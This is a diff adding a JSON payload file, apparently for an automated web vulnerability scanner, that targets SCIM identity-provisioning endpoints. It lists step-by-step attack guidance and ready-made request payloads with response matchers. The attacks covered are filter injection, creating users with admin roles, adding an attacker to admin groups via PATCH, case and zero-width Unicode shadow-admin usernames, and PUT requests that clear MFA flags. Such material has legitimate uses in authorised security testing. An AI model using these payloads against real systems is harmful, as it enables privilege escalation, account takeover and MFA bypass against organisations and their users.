@@ -1,0 +1,169 @@
+{
+  "category": "scim_provisioning",
+  "description": "SCIM (System for Cross-domain Identity Management, RFC 7643/7644) provisioning endpoints. Used by Okta, Azure AD, JumpCloud, OneLogin, Workday, etc. SCIM endpoints are often LESS hardened than the customer-facing app: filter injection, mass user create with admin attrs, group escalation via PATCH, and tokenless POSTs are common 2024-2026 bug-bounty findings.",
+  "craft_guidance": [
+    "1. DISCOVERY: probe /scim/v2/, /scim/v1/, /api/scim, /Users, /Groups, /ResourceTypes, /Schemas, /ServiceProviderConfig. SCIM /ServiceProviderConfig leaks SCIM version, supported features, auth scheme.",
+    "2. AUTH: SCIM commonly uses bearer tokens or Basic auth. Tokens may have broader privileges than app users. Check token scope by hitting /Users without filter.",
+    "3. FILTER INJECTION: SCIM filters use a tiny subset of language. Try filter='userName eq \"admin\") OR ('a'='a'. Lazy parsers concatenate into SQL/LDAP.",
+    "4. MASS USER CREATE: POST /Users with {userName, password, active:true, role:admin, externalId, ...}. Many SCIM servers honor attributes the IdP didn't intend to provision.",
+    "5. GROUP ESCALATION: PATCH /Groups/<admin_group_id> with op:add member; if SCIM token can write groups but app doesn't sync member-add events, attacker added directly.",
+    "6. PATCH OPERATIONS: SCIM PATCH supports add/replace/remove on attributes. Try replacing roles, entitlements, x509Certificates, password.",
+    "7. SHADOW USER: create user with `userName` matching a real admin; some implementations dedup wrong, allowing attacker to authenticate as real admin.",
+    "8. RESOURCE TYPE ABUSE: POST to /Schemas to register a schema that adds custom attributes the app trusts blindly.",
+    "9. EXTERNAL ID INJECTION: externalId is attacker-controlled; if app uses it as a join key with another system, you bridge identities.",
+    "10. PUT VS PATCH: PUT replaces the entire user object; PATCH applies partial mutation. PUT can clear protective attrs (mfa_required=false) by omission."
+  ],
+  "contexts": {
+    "endpoint_discovery": {
+      "description": "Discover SCIM endpoints. Often deployed on a subdomain or path the main app doesn't advertise.",
+      "tech_match": ["okta", "azure_ad", "jumpcloud", "onelogin", "workday", "scim"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/scim/v2/ServiceProviderConfig",
+          "description": "GET ServiceProviderConfig leaks SCIM version, supported endpoints, auth schemes, bulk support, filter support.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["scim", "schemas", "patch", "filter", "bulk"]}
+          ],
+          "severity": "low",
+          "confidence_boost": 25
+        },
+        {
+          "payload": "/scim/v2/Users",
+          "description": "GET /Users without filter — if 200 + user list, token is over-privileged or auth missing.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["totalResults", "Resources", "userName"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "filter_injection": {
+      "description": "SCIM filter expressions parsed naively into SQL or LDAP. Filter=userName eq \"...\" gives attacker control over the value.",
+      "tech_match": ["scim"],
+      "param_match": ["filter"],
+      "probes": [
+        {
+          "payload": "userName eq \"admin\") OR (\"a\" eq \"a\"",
+          "description": "SCIM filter SQL-style injection. If accepted, returns ALL users instead of just admin.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["totalResults"]},
+            {"type": "length_diff", "min_diff": 500}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        },
+        {
+          "payload": "userName eq \"admin\"; --",
+          "description": "Comment-style filter injection — strips trailing constraints. Indicative of LDAP/SQL backend.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "length_diff", "min_diff": 200}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "userName co \"\"",
+          "description": "Empty 'contains' — many backends return all users on empty match instead of empty result.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["totalResults"]}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        }
+      ]
+    },
+    "mass_user_create": {
+      "description": "POST /Users with admin attributes. SCIM POST often accepts more attributes than the IdP exposes via GUI.",
+      "tech_match": ["scim"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"schemas\":[\"urn:ietf:params:scim:schemas:core:2.0:User\"],\"userName\":\"swk_test\",\"active\":true,\"password\":\"x\",\"roles\":[{\"value\":\"admin\"}]}",
+          "description": "Create a user with role=admin via SCIM. If returned 201, role was applied without further check.",
+          "matchers": [
+            {"type": "status", "status": [201]},
+            {"type": "word", "any": ["admin", "id\":"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "{\"schemas\":[\"urn:ietf:params:scim:schemas:core:2.0:User\",\"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User\"],\"userName\":\"swk_test2\",\"urn:ietf:params:scim:schemas:extension:enterprise:2.0:User\":{\"manager\":{\"value\":\"<admin_id>\"},\"department\":\"IT\"},\"active\":true}",
+          "description": "Enterprise extension — set manager / department to bypass org policy gates.",
+          "matchers": [
+            {"type": "status", "status": [201]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "group_patch_escalation": {
+      "description": "PATCH /Groups/<admin_group_id> to add attacker as member. SCIM group changes often skip the access-control checks the app GUI enforces.",
+      "tech_match": ["scim"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"schemas\":[\"urn:ietf:params:scim:api:messages:2.0:PatchOp\"],\"Operations\":[{\"op\":\"add\",\"path\":\"members\",\"value\":[{\"value\":\"<attacker_user_id>\",\"display\":\"swk_test\"}]}]}",
+          "description": "Add self to admin group via SCIM PATCH. If 200/204, escalation succeeded.",
+          "matchers": [
+            {"type": "status", "status": [200, 204]},
+            {"type": "not_word", "words": ["forbidden", "permission_denied", "insufficient"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70
+        }
+      ]
+    },
+    "shadow_admin_username": {
+      "description": "Create a SCIM user with userName matching a real admin. Some apps deduplicate wrong (e.g. case-insensitive vs case-sensitive mismatch).",
+      "tech_match": ["scim"],
+      "param_match": ["userName"],
+      "probes": [
+        {
+          "payload": "{\"schemas\":[\"urn:ietf:params:scim:schemas:core:2.0:User\"],\"userName\":\"Admin\",\"active\":true,\"password\":\"swk_test\"}",
+          "description": "Case-variant of existing 'admin' user. If 201, duplicate-username check is case-sensitive while auth lookup is not — attacker authenticates as admin.",
+          "matchers": [
+            {"type": "status", "status": [201]},
+            {"type": "not_word", "words": ["duplicate", "already exists", "conflict"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{\"schemas\":[\"urn:ietf:params:scim:schemas:core:2.0:User\"],\"userName\":\"admin\\u200b\",\"active\":true}",
+          "description": "Unicode zero-width append — bypasses string-equality dedup but may match in normalized lookup.",
+          "matchers": [
+            {"type": "status", "status": [201]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "put_attribute_clear": {
+      "description": "PUT /Users/<id> replaces the entire user object. Omitting protective attrs (mfa_enabled, password_change_required, locked) clears them.",
+      "tech_match": ["scim"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"schemas\":[\"urn:ietf:params:scim:schemas:core:2.0:User\"],\"id\":\"<victim_id>\",\"userName\":\"victim\",\"active\":true}",
+          "description": "Minimal PUT — drops all extra attributes. If MFA flag silently clears, lockout / MFA bypass.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "not_word", "words": ["mfa_required", "lock"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    }
+  }
+}
